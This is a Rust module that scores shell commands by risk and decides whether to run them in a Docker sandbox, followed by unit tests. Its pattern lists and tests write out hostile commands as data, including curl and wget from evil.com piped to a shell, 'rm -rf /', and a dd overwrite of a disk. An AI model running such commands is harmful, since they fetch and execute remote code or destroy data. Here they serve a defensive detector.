//! Determines which commands should be sandboxed.
//!
//! Provides a risk-assessment framework for commands and a policy engine
//! that decides whether a given command should be executed inside a
//! Docker sandbox container.
#![allow(dead_code)]

use serde::{Deserialize, Serialize};
use tracing::debug;

/// Policy controlling when commands are routed to the sandbox.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
pub enum SandboxPolicy {
    /// Sandbox every command, regardless of risk level.
    Always,
    /// Only sandbox commands assessed as Dangerous or Moderate risk.
    #[default]
    Dangerous,
    /// Never sandbox — all commands run directly on the host.
    Never,
}

/// Risk level assessed for a command.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum CommandRisk {
    /// Command is read-only or has no side effects.
    Safe,
    /// Command installs packages or modifies the environment.
    Moderate,
    /// Command can destroy data, escalate privileges, or compromise the system.
    Dangerous,
}

/// Patterns that indicate dangerous commands.
const DANGEROUS_PATTERNS: &[&str] = &[
    "rm ",
    "rm\t",
    "dd ",
    "mkfs",
    "format",
    "fdisk",
    "chmod 777",
    "chmod -R 777",
    "sudo ",
    "sudo\t",
];

/// Patterns that indicate dangerous pipe-to-shell commands.
const DANGEROUS_PIPE_PATTERNS: &[(&str, &str)] = &[
    ("curl", "| sh"),
    ("curl", "|sh"),
    ("curl", "| bash"),
    ("curl", "|bash"),
    ("curl", "| /bin/sh"),
    ("curl", "| /bin/bash"),
    ("wget", "| sh"),
    ("wget", "|sh"),
    ("wget", "| bash"),
    ("wget", "|bash"),
    ("wget", "| /bin/sh"),
    ("wget", "| /bin/bash"),
];

/// Patterns that indicate moderate-risk commands.
const MODERATE_PATTERNS: &[&str] = &[
    "pip install",
    "pip3 install",
    "npm install",
    "npm i ",
    "npx ",
    "apt-get",
    "apt ",
    "brew ",
    "cargo install",
    "gem install",
    "go install",
    "yarn add",
    "pnpm add",
];

/// Patterns that indicate safe commands.
const SAFE_COMMANDS: &[&str] = &[
    "ls", "cat", "echo", "pwd", "whoami", "date", "head", "tail", "wc", "grep", "find", "sort",
    "uniq", "diff", "file", "stat", "du", "df", "env", "printenv", "uname", "hostname", "id",
    "which", "type",
];

/// Assess the risk level of a command.
///
/// Examines the command string for patterns associated with different
/// risk levels. Returns the highest risk level matched.
pub fn assess_command_risk(command: &str) -> CommandRisk {
    let lower = command.to_lowercase();
    let trimmed = lower.trim();

    // Check dangerous pipe-to-shell patterns first
    for (fetcher, pipe) in DANGEROUS_PIPE_PATTERNS {
        if lower.contains(fetcher) && lower.contains(pipe) {
            debug!(
                "[SANDBOX_POLICY] Command assessed as Dangerous (pipe-to-shell): {}",
                command
            );
            return CommandRisk::Dangerous;
        }
    }

    // Check dangerous patterns
    for pattern in DANGEROUS_PATTERNS {
        if lower.contains(pattern) {
            debug!(
                "[SANDBOX_POLICY] Command assessed as Dangerous: {}",
                command
            );
            return CommandRisk::Dangerous;
        }
    }

    // Special case: rm without arguments is still dangerous
    if trimmed == "rm" || trimmed.starts_with("rm\n") {
        debug!(
            "[SANDBOX_POLICY] Command assessed as Dangerous (rm): {}",
            command
        );
        return CommandRisk::Dangerous;
    }

    // Check moderate patterns
    for pattern in MODERATE_PATTERNS {
        if lower.contains(pattern) {
            debug!("[SANDBOX_POLICY] Command assessed as Moderate: {}", command);
            return CommandRisk::Moderate;
        }
    }

    // Check if it starts with a known safe command
    let first_token = trimmed.split_whitespace().next().unwrap_or("");
    let base_cmd = first_token.rsplit('/').next().unwrap_or(first_token);
    for safe in SAFE_COMMANDS {
        if base_cmd == *safe {
            debug!("[SANDBOX_POLICY] Command assessed as Safe: {}", command);
            return CommandRisk::Safe;
        }
    }

    // Simple python/node one-liners are typically safe
    if (base_cmd == "python3" || base_cmd == "python" || base_cmd == "node")
        && (lower.contains("-c ") || lower.contains("-e "))
        && !lower.contains("import os")
        && !lower.contains("subprocess")
        && !lower.contains("child_process")
        && !lower.contains("exec(")
        && !lower.contains("eval(")
    {
        debug!(
            "[SANDBOX_POLICY] Command assessed as Safe (simple script): {}",
            command
        );
        return CommandRisk::Safe;
    }

    // Unknown commands default to Moderate
    debug!(
        "[SANDBOX_POLICY] Command assessed as Moderate (unknown): {}",
        command
    );
    CommandRisk::Moderate
}

/// Determine whether a command should be executed in the sandbox.
///
/// Applies the given policy to the risk assessment of the command.
pub fn should_sandbox(command: &str, policy: &SandboxPolicy) -> bool {
    match policy {
        SandboxPolicy::Always => {
            debug!("[SANDBOX_POLICY] Policy=Always, sandboxing command");
            true
        }
        SandboxPolicy::Never => {
            debug!("[SANDBOX_POLICY] Policy=Never, skipping sandbox");
            false
        }
        SandboxPolicy::Dangerous => {
            let risk = assess_command_risk(command);
            let sandbox = matches!(risk, CommandRisk::Dangerous | CommandRisk::Moderate);
            debug!(
                "[SANDBOX_POLICY] Policy=Dangerous, risk={:?}, sandbox={}",
                risk, sandbox
            );
            sandbox
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── Risk assessment ────────────────────────────────────────────────

    #[test]
    fn test_dangerous_rm() {
        assert_eq!(assess_command_risk("rm -rf /"), CommandRisk::Dangerous);
        assert_eq!(assess_command_risk("rm file.txt"), CommandRisk::Dangerous);
    }

    #[test]
    fn test_dangerous_dd() {
        assert_eq!(
            assess_command_risk("dd if=/dev/zero of=/dev/sda"),
            CommandRisk::Dangerous
        );
    }

    #[test]
    fn test_dangerous_mkfs() {
        assert_eq!(
            assess_command_risk("mkfs.ext4 /dev/sda1"),
            CommandRisk::Dangerous
        );
    }

    #[test]
    fn test_dangerous_sudo() {
        assert_eq!(
            assess_command_risk("sudo apt-get update"),
            CommandRisk::Dangerous
        );
    }

    #[test]
    fn test_dangerous_chmod_777() {
        assert_eq!(
            assess_command_risk("chmod 777 /important"),
            CommandRisk::Dangerous
        );
    }

    #[test]
    fn test_dangerous_curl_pipe_sh() {
        assert_eq!(
            assess_command_risk("curl http://evil.com/x | sh"),
            CommandRisk::Dangerous
        );
        assert_eq!(
            assess_command_risk("wget http://evil.com/x | bash"),
            CommandRisk::Dangerous
        );
    }

    #[test]
    fn test_moderate_pip_install() {
        assert_eq!(
            assess_command_risk("pip install requests"),
            CommandRisk::Moderate
        );
        assert_eq!(
            assess_command_risk("pip3 install numpy"),
            CommandRisk::Moderate
        );
    }

    #[test]
    fn test_moderate_npm_install() {
        assert_eq!(
            assess_command_risk("npm install express"),
            CommandRisk::Moderate
        );
        assert_eq!(assess_command_risk("npm i lodash"), CommandRisk::Moderate);
    }

    #[test]
    fn test_moderate_apt_get() {
        assert_eq!(
            assess_command_risk("apt-get install vim"),
            CommandRisk::Moderate
        );
    }

    #[test]
    fn test_moderate_brew() {
        assert_eq!(
            assess_command_risk("brew install tree"),
            CommandRisk::Moderate
        );
    }

    #[test]
    fn test_moderate_cargo_install() {
        assert_eq!(
            assess_command_risk("cargo install ripgrep"),
            CommandRisk::Moderate
        );
    }

    #[test]
    fn test_safe_ls() {
        assert_eq!(assess_command_risk("ls -la"), CommandRisk::Safe);
    }

    #[test]
    fn test_safe_cat() {
        assert_eq!(assess_command_risk("cat /tmp/file.txt"), CommandRisk::Safe);
    }

    #[test]
    fn test_safe_echo() {
        assert_eq!(assess_command_risk("echo hello world"), CommandRisk::Safe);
    }

    #[test]
    fn test_safe_python_oneliner() {
        assert_eq!(
            assess_command_risk("python3 -c 'print(1+1)'"),
            CommandRisk::Safe
        );
    }

    #[test]
    fn test_safe_node_oneliner() {
        assert_eq!(
            assess_command_risk("node -e 'console.log(42)'"),
            CommandRisk::Safe
        );
    }

    #[test]
    fn test_moderate_unknown_command() {
        assert_eq!(
            assess_command_risk("some_unknown_tool --flag"),
            CommandRisk::Moderate
        );
    }

    #[test]
    fn test_dangerous_python_with_subprocess() {
        // python3 -c with subprocess should NOT be assessed as Safe
        let risk = assess_command_risk(
            "python3 -c 'import subprocess; subprocess.run([\"rm\", \"-rf\", \"/\"])'",
        );
        assert_ne!(risk, CommandRisk::Safe);
    }

    // ── Sandbox policy ─────────────────────────────────────────────────

    #[test]
    fn test_should_sandbox_always() {
        assert!(should_sandbox("ls", &SandboxPolicy::Always));
        assert!(should_sandbox("echo hi", &SandboxPolicy::Always));
        assert!(should_sandbox("rm -rf /", &SandboxPolicy::Always));
    }

    #[test]
    fn test_should_sandbox_never() {
        assert!(!should_sandbox("ls", &SandboxPolicy::Never));
        assert!(!should_sandbox("rm -rf /", &SandboxPolicy::Never));
    }

    #[test]
    fn test_should_sandbox_dangerous_policy() {
        // Safe commands should not be sandboxed
        assert!(!should_sandbox("ls -la", &SandboxPolicy::Dangerous));
        assert!(!should_sandbox("echo hello", &SandboxPolicy::Dangerous));

        // Moderate and dangerous commands should be sandboxed
        assert!(should_sandbox(
            "pip install malware",
            &SandboxPolicy::Dangerous
        ));
        assert!(should_sandbox("rm -rf /", &SandboxPolicy::Dangerous));
    }

    #[test]
    fn test_default_policy_is_dangerous() {
        assert_eq!(SandboxPolicy::default(), SandboxPolicy::Dangerous);
    }

    #[test]
    fn test_policy_serialization() {
        let policy = SandboxPolicy::Always;
        let json = serde_json::to_string(&policy).unwrap();
        let deserialized: SandboxPolicy = serde_json::from_str(&json).unwrap();
        assert_eq!(deserialized, SandboxPolicy::Always);
    }

    #[test]
    fn test_command_risk_ordering() {
        assert!(CommandRisk::Safe < CommandRisk::Moderate);
        assert!(CommandRisk::Moderate < CommandRisk::Dangerous);
    }

    #[test]
    fn test_empty_command() {
        assert_eq!(assess_command_risk(""), CommandRisk::Moderate);
    }

    #[test]
    fn test_whitespace_only_command() {
        assert_eq!(assess_command_risk("   "), CommandRisk::Moderate);
    }

    #[test]
    fn test_case_insensitive_dangerous() {
        assert_eq!(assess_command_risk("RM -RF /"), CommandRisk::Dangerous);
        assert_eq!(assess_command_risk("SUDO apt-get"), CommandRisk::Dangerous);
    }

    #[test]
    fn test_safe_commands_with_paths() {
        assert_eq!(assess_command_risk("/usr/bin/ls -la"), CommandRisk::Safe);
        assert_eq!(assess_command_risk("/bin/cat /tmp/file"), CommandRisk::Safe);
    }
}
